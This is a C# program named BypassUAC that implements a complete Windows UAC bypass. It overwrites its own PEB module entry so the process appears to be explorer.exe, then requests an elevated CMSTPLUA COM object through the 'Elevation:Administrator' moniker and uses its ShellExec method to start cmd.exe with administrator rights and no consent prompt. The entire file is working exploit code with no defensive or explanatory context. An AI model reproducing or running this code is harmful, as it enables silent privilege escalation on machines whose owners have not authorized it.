using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace BypassUAC
{
    class Program
    {
        public enum NtStatus : uint
        {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }

        public static bool IsSuccess(NtStatus status) => status >= NtStatus.Success && status < NtStatus.Informational;
        public static bool IsWOW64() => IntPtr.Size == 4;
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct PROCESS_BASIC_INFORMATION
        {
#if (Is64)
            public UInt64 ExitStatus;
#else
            public UInt32 ExitStatus;
#endif
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
#if (Is64)
            public long BasePriority;
#else
            public Int32 BasePriority;
#endif
            public UIntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;

            public int Size
            {
                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
            }
        }

        [StructLayout(LayoutKind.Explicit, Size = 0x40)]
        public struct PEB
        {
            [FieldOffset(0x000)]
            public byte InheritedAddressSpace;
            [FieldOffset(0x001)]
            public byte ReadImageFileExecOptions;
            [FieldOffset(0x002)]
            public byte BeingDebugged;
            [FieldOffset(0x003)]
#if (Is64)
            public byte Spare;
            [FieldOffset(0x008)]
            public IntPtr Mutant;
            [FieldOffset(0x010)]
            public IntPtr ImageBaseAddress; // (PVOID)
            [FieldOffset(0x018)]
            public IntPtr Ldr; // (PPEB_LDR_DATA)
            [FieldOffset(0x020)]
            public IntPtr ProcessParameters; // (PRTL_USER_PROCESS_PARAMETERS)
            [FieldOffset(0x028)]
            public IntPtr SubSystemData; // (PVOID)
            [FieldOffset(0x030)]
            public IntPtr ProcessHeap; // (PVOID)
            [FieldOffset(0x038)]
            public IntPtr FastPebLock; // (PRTL_CRITICAL_SECTION)
#else
            public byte Spare;
            [FieldOffset(0x004)]
            public IntPtr Mutant;
            [FieldOffset(0x008)]
            public IntPtr ImageBaseAddress; // (PVOID)
            [FieldOffset(0x00c)]
            public IntPtr Ldr; // (PPEB_LDR_DATA)
            [FieldOffset(0x010)]
            public IntPtr ProcessParameters; // (PRTL_USER_PROCESS_PARAMETERS)
            [FieldOffset(0x014)]
            public IntPtr SubSystemData; // (PVOID)
            [FieldOffset(0x018)]
            public IntPtr ProcessHeap; // (PVOID)
            [FieldOffset(0x01c)]
            public IntPtr FastPebLock; // (PRTL_CRITICAL_SECTION)
#endif //Is64
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PEB_LDR_DATA
        {
            public UInt32 Length;
            public Byte Initialized;
            public IntPtr SsHandle;
            public LIST_ENTRY InLoadOrderModuleList;
            public LIST_ENTRY InMemoryOrderModuleList;
            public LIST_ENTRY InInitializationOrderModuleList;
            public IntPtr EntryInProgress;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public LIST_ENTRY InLoadOrderLinks;
            public LIST_ENTRY InMemoryOrderLinks;
            public LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public UInt32 SizeOfImage;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }
        public enum PageProtection : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            UInt32 nSize,
            ref IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UInt32 dwSize,
            PageProtection flNewProtect,
            ref IntPtr lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("ntdll.dll")]
        public static extern void RtlEnterCriticalSection(
            IntPtr lpCriticalSection);

        [DllImport("ntdll.dll")]
        public static extern void RtlLeaveCriticalSection(
            IntPtr lpCriticalSection);

        [DllImport("ntdll.dll")]
        public static extern NtStatus NtQueryInformationProcess(
            IntPtr ProcessHandle,
            int ProcessInformationClass,
            IntPtr ProcessInformation,
            int ProcessInformationLength,
            ref int ReturnLength);

        public enum HRESULT : long
        {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BIND_OPTS3
        {
            public uint cbStruct;
            public uint grfFlags;
            public uint grfMode;
            public uint dwTickCountDeadline;
            public uint dwTrackFlags;
            public uint dwClassContext;
            public uint locale;
            public IntPtr pServerInfo; // will be passing null, so type doesn't matter
            public IntPtr hwnd;
        }

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        internal static extern int CoGetObject(
                    string pszName,
                    [In] ref BIND_OPTS3 pBindOptions,
                    [In, MarshalAs(UnmanagedType.LPStruct)] Guid riid,
                    [MarshalAs(UnmanagedType.IUnknown)] out object rReturnedComObject);

        [Flags]
        public enum CLSCTX
        {
            CLSCTX_INPROC_SERVER = 0x1,
            CLSCTX_INPROC_HANDLER = 0x2,
            CLSCTX_LOCAL_SERVER = 0x4,
            CLSCTX_REMOTE_SERVER = 0x10,
            CLSCTX_NO_CODE_DOWNLOAD = 0x400,
            CLSCTX_NO_CUSTOM_MARSHAL = 0x1000,
            CLSCTX_ENABLE_CODE_DOWNLOAD = 0x2000,
            CLSCTX_NO_FAILURE_LOG = 0x4000,
            CLSCTX_DISABLE_AAA = 0x8000,
            CLSCTX_ENABLE_AAA = 0x10000,
            CLSCTX_FROM_DEFAULT_CONTEXT = 0x20000,
            CLSCTX_INPROC = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
            CLSCTX_SERVER = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
            CLSCTX_ALL = CLSCTX_SERVER | CLSCTX_INPROC_HANDLER
        }

        [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface ILua
        {
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method1();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method2();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method3();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method4();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method5();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method6();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            HRESULT ShellExec(
                [In, MarshalAs(UnmanagedType.LPWStr)] string file,
                [In, MarshalAs(UnmanagedType.LPWStr)] string paramaters,
                [In, MarshalAs(UnmanagedType.LPWStr)] string directory,
                [In] uint fMask,
                [In] uint nShow);
        }


        public static object LaunchElevatedCOMObject(Guid Clsid, Guid InterfaceID)
        {
            string CLSID = Clsid.ToString("B"); // B formatting directive: returns {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 
            string monikerName = "Elevation:Administrator!new:" + CLSID;

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(bo);
            bo.dwClassContext = (int)CLSCTX.CLSCTX_LOCAL_SERVER;

            object retVal;

            int h = CoGetObject(monikerName, ref bo, InterfaceID, out retVal);
            if (h != 0) return null;

            return retVal;
        }

        static IntPtr StructureToPtr(object obj)
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
            Marshal.StructureToPtr(obj, ptr, false);
            return ptr;
        }
        public static void McfInitUnicodeString(IntPtr procHandle, IntPtr lpDestAddress, string uniStr)
        {
            UNICODE_STRING masq = new UNICODE_STRING(uniStr);
            IntPtr masqPtr = StructureToPtr(masq);
            IntPtr lpflOldProtect = IntPtr.Zero;
            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;

            VirtualProtectEx(procHandle, lpDestAddress, (uint)Marshal.SizeOf(typeof(UNICODE_STRING)), PageProtection.PAGE_EXECUTE_READWRITE, ref lpflOldProtect);
            WriteProcessMemory(procHandle, lpDestAddress, masqPtr, (uint)Marshal.SizeOf(typeof(UNICODE_STRING)), ref lpNumberOfBytesWritten);
        }
        public static void MasqueradePEB()
        {
            IntPtr pbiPtr = IntPtr.Zero;
            IntPtr pebPtr = IntPtr.Zero;
            IntPtr pldPtr = IntPtr.Zero;
            IntPtr lpflOldProtect = IntPtr.Zero;
            int result = 0;
            IntPtr FullDllNamePtr, BaseDllNamePtr;
            PEB peb;
            PEB_LDR_DATA pld;

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            //string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            IntPtr procHandle = GetCurrentProcess();
            pbiPtr = StructureToPtr(pbi);
            NtStatus Status = Program.NtQueryInformationProcess(procHandle, 0, pbiPtr, Marshal.SizeOf(pbi), ref result);
            //MessageBox.Show($"return code {Status:X}");
            if (IsSuccess(Status))
            {

                pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pbiPtr, typeof(PROCESS_BASIC_INFORMATION));
                peb = (PEB)Marshal.PtrToStructure(pbi.PebBaseAddress, typeof(PEB));
                pld = (PEB_LDR_DATA)Marshal.PtrToStructure(peb.Ldr, typeof(PEB_LDR_DATA));
                PEB_LDR_DATA StartModule = (PEB_LDR_DATA)Marshal.PtrToStructure(peb.Ldr, typeof(PEB_LDR_DATA));
                IntPtr pStartModuleInfo = StartModule.InLoadOrderModuleList.Flink;
                IntPtr pNextModuleInfo = pld.InLoadOrderModuleList.Flink;
                RtlEnterCriticalSection(peb.FastPebLock);
                if (IsWOW64())
                {
                    //MessageBox.Show("32bit process");
                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x24);
                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x2C);
                }
                else
                {
                    //MessageBox.Show("64bit process");
                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x48);
                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x58);
                }
                do
                {
                    LDR_DATA_TABLE_ENTRY ldte = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(pNextModuleInfo, typeof(LDR_DATA_TABLE_ENTRY));


                    if (ldte.DllBase == peb.ImageBaseAddress)
                    {

                        //RtlInitUnicodeString(ref ldte.BaseDllName, "explorer.exe");
                        //RtlInitUnicodeString(ref ldte.FullDllName, "C:\\windows\\explorer.exe");
                        McfInitUnicodeString(procHandle, BaseDllNamePtr, "explorer.exe");
                        McfInitUnicodeString(procHandle, FullDllNamePtr, $"{System.Environment.GetEnvironmentVariable("SystemRoot").ToLower()}\\explorer.exe");
                        break;
                    }

                    pNextModuleInfo = ldte.InLoadOrderLinks.Flink;

                } while (pNextModuleInfo != pStartModuleInfo);
                RtlLeaveCriticalSection(peb.FastPebLock);
            }
            return;
        }


        [STAThread]
        static void Main(string[] args)
        {
            Guid classId = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
            Guid interfaceId = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

            MasqueradePEB();

            object elvObject = LaunchElevatedCOMObject(classId, interfaceId);
            if (elvObject != null)
            {
                //MessageBox.Show("Got the Object");
                ILua ihw = (ILua)elvObject;
                ihw.ShellExec("c:\\windows\\system32\\cmd.exe", null, null, 0, 5);
                Marshal.ReleaseComObject(elvObject);
            }
        }
    }
}
